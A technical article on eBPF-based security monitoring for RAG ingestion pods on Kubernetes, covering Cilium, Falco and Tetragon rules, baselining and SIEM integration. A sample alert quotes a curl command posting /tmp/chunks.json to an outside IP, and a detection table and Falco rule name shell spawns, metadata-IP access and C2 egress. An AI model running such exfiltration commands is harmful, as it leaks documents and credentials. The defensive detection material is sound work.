---
title: "RAG: Ebpf Security Observability"
slug: "rag-ebpf-security-observability"
description: "eBPF for security observability in RAG infrastructure — syscall tracing, network telemetry, runtime threat detection, and low-overhead monitoring on Kubernetes."
datePublished: "2025-11-15"
dateModified: "2026-07-17"
tags: ["AI", "Rag", "Ebpf"]
keywords: "rag, ebpf, security, observability, ai, production, engineering, architecture"
faq:
  - q: "Why is eBPF useful for securing RAG ingestion workloads?"
    a: "Ingestion workers parse untrusted documents, shell out to OCR binaries, and call external embedding APIs. eBPF programs attach to syscalls and network events in the kernel without modifying application code—detecting unexpected subprocess spawns, suspicious egress to unknown IPs, and crypto-mining patterns with single-digit percent overhead."
  - q: "Which eBPF tools are production-ready for Kubernetes RAG clusters?"
    a: "Cilium for network policy and Hubble observability, Falco or Tetragon for runtime threat rules, Pixie for automatic service maps, and bpftrace for ad hoc kernel introspection. Most teams start with Cilium network visibility plus Falco rules tuned for ingestion pod baselines."
  - q: "Does eBPF replace application logging for RAG services?"
    a: "No—it complements it. eBPF sees kernel-level behavior apps never log: DNS queries to paste sites, writes to /tmp from a parser that should only read S3, connect() to IPs outside your embedding provider allowlist. Combine with structured app logs for request-level correlation."
---
A compromised document parser pod started mining cryptocurrency three days before anyone noticed. Application logs showed normal parse completion metrics—the malicious binary was invoked via a shell escape in a vulnerable PDF library, not through instrumented code paths. CloudTrail logged S3 reads correctly; nobody monitored egress on port 3333 to an unknown host. The blast radius stayed small only because the pod's IAM role lacked broad permissions—but RAG pipelines often carry embedding API keys and access to pre-redaction document buckets.

**eBPF** (extended Berkeley Packet Filter) runs sandboxed programs in the Linux kernel in response to events—syscalls, network packets, file opens—without loading kernel modules or restarting nodes. For RAG infrastructure processing untrusted content at scale, eBPF provides **security observability** that sees what applications omit: process ancestry, unexpected network destinations, and privilege escalation attempts with overhead low enough for always-on production clusters.

## What eBPF sees that apps miss

RAG ingestion pod expected behavior:

- Read objects from S3 via SDK (HTTPS 443 to AWS endpoints)
- Spawn `tesseract` or `pdftotext` with fixed argv patterns
- POST embedding batches to `api.openai.com` or internal gateway
- Write structured logs to stdout

Unexpected behaviors eBPF catches:

| Event | Possible meaning |
|-------|------------------|
| execve `/bin/sh -c curl` from parser | Shell escape, exfiltration |
| connect() to non-allowlisted IP:port | C2, mining pool, data exfil |
| write large files to `/tmp` then upload | Staged document theft |
| ptrace attach | Debugging/injection attack |
| unexpected DNS to `.onion` or paste sites | C2 beacon setup |

Kernel visibility is ground truth; attackers must evade syscall hooks, not just hide from log4j.

## Architecture on Kubernetes

Typical stack:

```
[Ingestion pods]
       ↓ syscalls / network
[Kernel eBPF programs] ← loaded by DaemonSet agent
       ↓ events
[Userspace exporter] → Falco / Hubble / custom OTel
       ↓
[SIEM / alert manager] correlated with k8s metadata (pod, namespace, corpus job ID)
```

**Cilium** replaces kube-proxy with eBPF dataplane, enforces L3/L4/L7 network policy, and exposes Hubble UI for flow logs—"which pods talked to embedding API vs unknown IPs."

**Falco** (CNCF) evaluates rules against eBPF events:

```yaml
- rule: Unexpected Shell in Ingestion Pod
  desc: Shell spawned in rag-ingest namespace
  condition: >
    spawned_process and k8s.ns.name = "rag-ingest"
    and proc.name in (bash, sh, zsh)
    and not proc.pname in (tesseract, pdftotext, node)
  output: "Shell in ingest pod (user=%user.name command=%proc.cmdline)"
  priority: CRITICAL
```

Tune `proc.pname` allowlists from baseline profiling—blind rules flood false positives.

**Tetragon** (Isovalent) adds process lifecycle enforcement—kill pods on policy violation, not only alert.

## Baseline profiling before alerting

Week one: **observe-only** mode. Collect:

- Process exec trees per Dockerfile layer
- Egress destination histogram per deployment
- DNS query patterns

Build allowlists from p99 normal behavior, not imagination. Ingestion v2 adding `ffmpeg` for video should update baseline via GitOps rule PR, not trigger 3 a.m. pages.

Store baselines as code beside Helm charts; review in same PR as parser feature changes.

## Correlating eBPF events with RAG context

Kernel events lack `corpus_id` unless you enrich. Options:

- **Kubernetes labels** on pods: `corpus=legal-us`, `job-id=sync-20260716`
- **OpenTelemetry trace context** propagated to eBPF via uprobes on log calls (advanced)
- **Sidecar metadata**: Falco k8s metadata plugin maps pod → labels automatically

Alert format operators need:

```text
CRITICAL: Shell in ingest pod
  namespace: rag-ingest
  pod: parser-7f3a-kl2m
  labels: corpus=legal-us job= nightly-sync
  command: curl -X POST http://185.x.x.x:3333 -d @/tmp/chunks.json
  action: pod terminated (Tetragon policy ingest-no-shell)
```

## Performance and safety

Modern eBPF (CO-RE, BTF) adapts across kernel versions. Overhead targets:

- <3% CPU for syscall trace subset
- <1% for network flow accounting only

Start with network observability before syscall tracing every `read()`. Sample high-volume events if needed.

eBPF programs are verified for safety (bounded loops, no arbitrary kernel memory)—bad programs fail load, not panic kernel. Still test in staging clusters matching kernel version distribution.

## Threat detection playbooks

**Supply chain poisoned Python package** (dependency confusion): new execve of `/usr/bin/curl` or reverse shell pattern—Falco `Outbound Connection to Rare Destination` plus unexpected interpreter child.

**Malicious PDF exploit**: parser crash loop then shell—alert on restart count + shell within 60s window.

**Credential theft**: connect to metadata IP `169.254.169.254` from non-standard pod—SSRF/block via network policy; eBPF confirms attempt even if blocked.

**Lateral movement**: ingest pod connects to postgres namespace—should never happen; Cilium default-deny plus Hubble alert.

Run quarterly purple team exercises injecting benign "malicious" behaviors into staging parsers; measure time-to-detect.

## Compliance and data handling

eBPF flow logs may contain IPs and DNS names touching customer document metadata—classify retention under your logging policy. Avoid capturing HTTP bodies in kernel probes; headers and destinations suffice for security.

Document eBPF monitoring in SOC2/network diagrams—auditors increasingly ask how kernel-level visibility complements app logs.

## Limits of eBPF

- **Encrypted traffic content** invisible without TLS termination proxy—metadata (SNI, dest IP) still visible.
- **Userspace interpretation** of some attacks (prompt injection at HTTP layer) needs app WAF, not eBPF alone.
- **Windows nodes** lack same eBPF stack—heterogeneous clusters need alternate agents.

eBPF closes the observability gap between "parser metrics look fine" and "parser pod is exfiltrating chunks." Deploy Cilium or equivalent for network truth, Falco rules tuned on ingestion baselines, and correlate kernel events with corpus labels so security incidents name the blast radius—not just the pod hash.

## Kernel version and portability matrix

eBPF programs behave differently across kernel 5.4 vs 6.6—maintain **compatibility table** in repo listing tested distributions (EKS AMI versions, GKE node images). CI loads probes on representative kernels in VM before DaemonSet rollout.

CO-RE (Compile Once – Run Everywhere) reduces fragmentation but not eliminate testing—BTF availability varies on older nodes.

## Integrating with SIEM and ticketing

Export Falco events to Splunk/Datadog with normalized schema: `k8s.namespace`, `k8s.pod.name`, `evt.type`, `corpus.label`. Auto-create PagerDuty incidents only for rules tagged `rag-ingest-critical`—parser shell spawn pages; benign DNS retry tickets only.

Correlate eBPF alerts with RAG ingest job IDs via pod labels applied by job controller—without labels, SOC sees suspicious pod hash, not "nightly legal sync job 4412."

## Compliance mapping and audit evidence

Map Falco/Cilium rules to SOC2 CC7.2 and ISO 27001 A.12.4.1 for auditors—export sample alerts with timestamps showing detection during pen test. eBPF program source code in git satisfies change control evidence; kernel attachment logged in deployment pipeline.

Retain high-severity eBPF security events 13 months minimum or per regulatory schedule—immutable S3 bucket with object lock for tamper evidence in financial services RAG deployments.

## Developer experience for eBPF rule tuning

False positives erode trust fast. Provide **self-service Falco rule silencing** with 24h max duration and mandatory reason—silences expire automatically. Permanent rule changes require PR to git-managed Falco rules with platform security review.

Developer sandbox namespaces run same eBPF rules as prod in **log-only mode** first week—new parser deployments see would-have-fired alerts without pod kills. Promote to enforce after baseline stable.

Security observability via eBPF pays off when alerts route to teams who can act and rules evolve with RAG ingest behavior. Budget one engineer-quarter annually for rule hygiene, false positive review, and kernel upgrade compatibility—otherwise programs decay into ignored noise within two release cycles.

## Common regressions around ebpf security observability

Teams often pass a demo and then regress under load: retries without jitter, missing idempotency keys, or caches that never invalidate. Write a short regression list specific to ebpf security observability and turn each item into an automated check or a game-day step. Prefer failing CI on the regression over discovering it from customer tickets. When you change defaults, update alerts in the same pull request so observability stays coupled to behavior.
